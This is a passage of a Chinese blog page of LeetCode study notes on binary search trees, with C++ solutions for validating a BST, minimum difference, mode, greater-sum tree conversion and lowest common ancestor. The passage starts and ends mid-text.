3比6小而认为其正确。<br><strong>方法：中序遍历下，输出的二叉搜索树节点的数值是有序序列。</strong><br><strong>还有个坑：还【不能存在相同元素】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.中序遍历</span></span><br><span class="line"><span class="comment">    2.判断是否是递增，不能有重复</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; node;<span class="comment">//中序遍历 序列</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//中序遍历</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        node.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;node.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node[i<span class="number">-1</span>]&gt;=node[i])<span class="comment">//如果序列不是递增的，则false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>; <span class="comment">// 用来记录前一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">bool</span> left = <span class="built_in">isValidBST</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;val &gt;= root-&gt;val)   </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        pre = root; <span class="comment">// 记录前一个节点</span></span><br><span class="line">        <span class="keyword">bool</span> right = <span class="built_in">isValidBST</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;<span class="comment">//左右子树都符号条件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//官方递归  【好理解】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">helper</span><span class="params">(TreeNode* root, <span class="keyword">long</span> <span class="keyword">long</span> lower, <span class="keyword">long</span> <span class="keyword">long</span> upper)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//对于任意一个结点，它必须大于左结点，小于右结点</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val&lt;=lower || root-&gt;val&gt;=upper)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(root-&gt;left, lower, root-&gt;val) &amp;&amp; <span class="built_in">helper</span>(root-&gt;right, root-&gt;val, upper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(root, LONG_MIN, LONG_MAX);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代【中序遍历】  栈</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;</span><br><span class="line">        TreeNode* pre = <span class="literal">NULL</span>; <span class="comment">// 记录前一个节点</span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span> || !st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur = cur-&gt;left;   <span class="comment">//左</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = st.<span class="built_in">top</span>();    <span class="comment">//中</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; cur-&gt;val &lt;= pre-&gt;val)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                pre = cur; <span class="comment">//保存前一个访问的结点</span></span><br><span class="line">                cur = cur-&gt;right;   <span class="comment">//右</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="530-二叉搜索树的最小绝对差"><a href="#530-二叉搜索树的最小绝对差" class="headerlink" title="530 二叉搜索树的最小绝对差"></a>530 二叉搜索树的最小绝对差</h3><p>给你一棵【所有节点为非负值】的二叉搜索树，请你计算树中任意两节点的差的绝对值的最小值。<br><strong>思路：中序遍历是升序，则差最小值只可能 【结点相邻】</strong></p><ul><li><p>中序遍历一遍，求最小差值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先中序遍历 求得 升序序列</span></span><br><span class="line"><span class="comment">    再遍历序列，求 min</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; vec;<span class="comment">//记录中序遍历序列</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        vec.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">int</span> min = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;vec.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = vec[i]-vec[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">if</span>(num &lt; min)</span><br><span class="line">                min = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在中序遍历时 就求min</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">    <span class="keyword">int</span> res = INT_MAX;</span><br><span class="line">    TreeNode *pre = <span class="literal">nullptr</span>;<span class="comment">//记录前驱</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span>(pre)</span><br><span class="line">            res = <span class="built_in">min</span>(res,root-&gt;val-pre-&gt;val);<span class="comment">//更新最小值</span></span><br><span class="line">        pre = root;<span class="comment">//更新前驱</span></span><br><span class="line">        vec.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="501-二叉搜索树中的众数"><a href="#501-二叉搜索树中的众数" class="headerlink" title="501 二叉搜索树中的众数"></a>501 二叉搜索树中的众数</h3><p>给你一个含重复值的二叉搜索树（BST）的根节点 root ，找出并返回 BST 中的所有 众数【出现频率最高的元素】。<br>如果树中有不止一个众数，可以按 任意顺序 返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自定义 sort【降序排序】</span></span><br><span class="line"><span class="comment">    在中序遍历时就 哈希</span></span><br><span class="line"><span class="comment">    常用技巧：map-&gt;vector</span></span><br><span class="line"><span class="comment">    vector&lt;pair&lt;int,int&gt;&gt; vec(maap.begin(),maap.end());</span></span><br><span class="line"><span class="comment">    sort(vec.begin(), vec.end(), cmp); //排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; nums;<span class="comment">//存结果</span></span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//记录元素频率</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        nums.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        maap[root-&gt;val]++;<span class="comment">//哈希计数</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="keyword">static</span> <span class="title">cmp</span> <span class="params">(<span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; a, <span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.second &gt; b.second;<span class="comment">//降序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">int</span> max = INT_MIN;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;<span class="comment">//结果集</span></span><br><span class="line">        <span class="comment">//把maap内容，放入vector&lt;pair&lt;int,int&gt;&gt;中</span></span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; <span class="built_in">vec</span>(maap.<span class="built_in">begin</span>(), maap.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>(), cmp); <span class="comment">// 给频率排个序</span></span><br><span class="line">        res.<span class="built_in">push_back</span>(vec[<span class="number">0</span>].first);<span class="comment">//前面是最大的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; vec.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 取最高的放到result数组中</span></span><br><span class="line">            <span class="keyword">if</span> (vec[i].second == vec[<span class="number">0</span>].second) </span><br><span class="line">                res.<span class="built_in">push_back</span>(vec[i].first);</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    优化：利用 cur和pre 两个一前一后指针，在中序遍历时就 找众数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;<span class="comment">//最大频率</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//频率</span></span><br><span class="line">    TreeNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *cur)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(cur-&gt;left);<span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span>(pre==<span class="literal">nullptr</span>)<span class="comment">//第一个结点</span></span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pre-&gt;val == cur-&gt;val)</span><br><span class="line">            count++;<span class="comment">//当前结点值 和 上一个节点值相同</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count = <span class="number">1</span>;<span class="comment">//注意：容易忽略</span></span><br><span class="line">        pre = cur;<span class="comment">//更新pre</span></span><br><span class="line">        <span class="comment">// 如果和最大值相同，放进result中</span></span><br><span class="line">        <span class="keyword">if</span>(count == max)</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="comment">//更新 最大值</span></span><br><span class="line">        <span class="keyword">if</span>(count &gt; max)&#123;</span><br><span class="line">            max = count;</span><br><span class="line">            res.<span class="built_in">clear</span>();<span class="comment">// 关键一步，不要忘记清空result，之前result里的元素都失效了</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorder</span>(cur-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        max = <span class="number">0</span>;</span><br><span class="line">        TreeNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        res.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="538-把二叉搜索树转换为累加树"><a href="#538-把二叉搜索树转换为累加树" class="headerlink" title="538 把二叉搜索树转换为累加树"></a>538 把二叉搜索树转换为累加树</h3><p>给出二叉 搜索 树的根节点，该树的节点值各不相同，请你将其转换为累加树（Greater Sum Tree），使每个节点 node 的新值等于【原树中大于或等于 node.val 的值之和】。<br><img src="https://img-blog.csdnimg.cn/1acc0ed6893e4b00ba35cd1d73cb9818.png"></p><p>  中序遍历序列：0 1 2 3 4 5 6 7 8<br>  逆序过来进行遍历：8 7 6 5 4 3 2 1 0<br>  若每遍历一个结点，都用本结点值+前一个结点值<br>  【8 15 21 26 30 33 35 36 36】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    按照后序遍历顺序，依次加</span></span><br><span class="line"><span class="comment">    中序遍历：左根右 是递增序列</span></span><br><span class="line"><span class="comment">    本题应该按照 该递增序列的【逆序列】，进行改值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode *pre = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//记录前驱</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">postorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">        root-&gt;val += pre-&gt;val;</span><br><span class="line">        pre = root;<span class="comment">//更新前驱</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">postorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">postorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236 二叉树的最近公共祖先"></a>236 二叉树的最近公共祖先</h2></li></ul><p><strong>二叉树，只能通过后序遍历（即：回溯）实现从底向上的遍历方式。</strong><br><img src="https://img-blog.csdnimg.cn/1ded8f4b90704392bd7eccf255cdf375.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span> || root==q || root==p)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        TreeNode *right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span class="keyword">if</span>(left &amp;&amp; right)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(left &amp;&amp; !right)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!left &amp;&amp; right)</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235 二叉搜索树的最近公共祖先"></a>235 二叉搜索树的最近公共祖先</h2><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。<br>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”<br><strong>分析：</strong><br>该题当然也可以用上面二叉树的最近公共祖先求解<br>但对于二叉搜索树，应该利用其有序的特征，即 如果 中间节点是 q 和 p 的公共祖先，那么 中节点的数组 一定是在 [p, q]区间的。即 中节点 &gt; p &amp;&amp; 中节点 &lt; q 或者 中节点 &gt; q &amp;&amp; 中节点 &lt; p。</p><ul><li>只要从上到下去遍历，遇到 cur节点是数值在[p, q]区间中则一定可以说明该节点cur就是q 和 p的公共祖先。 那问题来了，一定是最近公共祖先吗？<ul><li>是的</li></ul></li><li><strong>所以当我们从上向下去递归遍历，第一次遇到 cur节点是数值在[p, q]区间中，那么cur就是 p和q的最近公共祖先</strong><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span 